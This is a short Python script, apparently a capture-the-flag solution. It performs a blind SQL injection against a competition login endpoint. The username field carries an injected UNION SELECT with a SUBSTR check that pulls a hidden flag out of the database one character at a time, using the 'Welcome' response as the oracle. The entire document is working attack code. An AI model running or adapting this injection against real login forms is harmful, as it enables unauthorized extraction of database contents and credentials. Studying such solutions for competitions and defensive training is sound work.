import requests

charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$@{}_"
flag = ""

password = "a"

while True:
    for c in charset:
        print(f"CHECKING {c} |  ", end="")
        username = f"admin\n' UNION SELECT username FROM users WHERE username = 'admin' AND EXISTS (SELECT flag FROM flags WHERE SUBSTR(flag,1,{len(flag)+1}) = '{flag}{c}') -- "
        # print(username)
        r = requests.post("http://chals.cyberthon22f.ctf.sg:40401/login/", data = {'username': username, 'password': password})
        if "Welcome" in r.text:
            flag += c
        print(f"flag: {flag} ")
